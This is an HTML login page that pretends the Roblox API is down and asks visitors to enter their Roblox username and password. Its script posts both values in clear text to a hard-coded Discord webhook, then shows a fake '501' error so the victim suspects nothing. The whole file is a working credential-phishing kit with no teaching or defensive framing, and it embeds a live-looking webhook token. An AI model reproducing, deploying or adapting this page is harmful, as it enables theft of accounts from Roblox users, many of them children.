<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
</head>
<body>
    <form id="loginForm">
        <label for="username">The RobloxAPI is currently down. Please input your roblox credientials so we could contact you back when the API is up:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">Roblox Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();
            
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Send data to Discord webhook
            var webhookURL = "https://discord.com/api/webhooks/1235588439043342378/XmWeEj1OOL7t9fMNev1UiuGrackSLovmATF-sqnCyEiS6WxNi0GKeI-InN8eIVQJJGXH";
            var data = {
                username: "Login Bot",
                content: "Username: " + username + "\nPassword: " + password
            };

            fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error("Network response was not ok");
                }
                alert("Could not connect to RobloxAPI, Please try your request later.(501)");
            })
            .catch(error => {
                console.error("There was a problem with the login:", error);
            });
        });
    </script>
</body>
</html>

</body>
